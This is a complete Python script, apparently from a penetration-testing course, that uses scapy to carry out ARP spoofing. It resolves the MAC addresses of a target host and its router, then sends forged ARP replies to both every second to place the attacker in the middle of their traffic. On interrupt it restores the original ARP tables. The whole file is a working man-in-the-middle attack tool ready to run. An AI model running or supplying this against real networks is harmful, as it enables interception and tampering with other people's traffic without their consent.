import scapy.all as scapy
import time
import optparse

# getting arguments
parser = optparse.OptionParser()
parser.add_option('-i', dest='target_ip', help="enter the target device's IP address")
parser.add_option('-r', dest='router_ip', help="enter the router's IP address")
(options, arg) = parser.parse_args()

if not options.router_ip:
    print("please provide router's IP address")
    quit()

if not options.target_ip:
    print("please provide target's IP address")
    quit()

# getting the MAC address of the target computer
def get_mac(ip):
    ARP_request = scapy.ARP()
    ARP_request.pdst = ip
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    ARP_broadcast = broadcast/ARP_request
    # print(ARP_broadcast.show())
    answer = scapy.srp(ARP_broadcast, verbose=False)[0]
    # print(answer.summary())
    # print('-------------------------------')
    # print(answer[0])
    # print('-------------------------------')
    # print(type(answer))
    # print(answer[0][0])
    # print('-------------------------------')
    # print(answer[0][1].hwsrc)
    return answer[0][1].hwsrc

def arp_spoof(target_ip, pretending_ip):
    # creating an ARP response
    ARP_packet = scapy.ARP()
    # scapy.ls(scapy.ARP())

    # getting the target's MAC address
    target_MAC = get_mac(target_ip)

    # op is set to 1 by default, which is a request, setting op to 2 to e it a response
    ARP_packet.op = 2
    ARP_packet.pdst = target_ip  # target IP (win10)
    ARP_packet.hwdst = target_MAC  # target MAC (win10)
    ARP_packet.psrc = pretending_ip # gateway IP
    # print(ARP_packet.summary())
    # print(ARP_packet.show())
    scapy.send(ARP_packet, verbose=0)

# prepare a packet to restore the original ARP table once the attack is over
def restore_ARP(target_ip, pretending_ip):
    restore_packet = scapy.ARP()
    target_MAC = get_mac(target_ip)
    router_MAC = get_mac(pretending_ip)
    restore_packet.op = 2
    restore_packet.pdst = target_ip
    restore_packet.hwdst = target_MAC
    restore_packet.psrc = pretending_ip
    restore_packet.hwsrc = router_MAC
    scapy.send(restore_packet, verbose=False)

# trick the router and the target. When the attack is over - ctrl + c detected, restore ARP table
try:
    while True:
        arp_spoof(options.target_ip, options.router_ip)
        arp_spoof(options.router_ip, options.target_ip)
        print('packets sent')
        time.sleep(1)
except KeyboardInterrupt:
    print("\nrestoring target and router's ARP table and quitting")
    restore_ARP(options.target_ip, options.router_ip)
    restore_ARP(options.router_ip, options.target_ip)




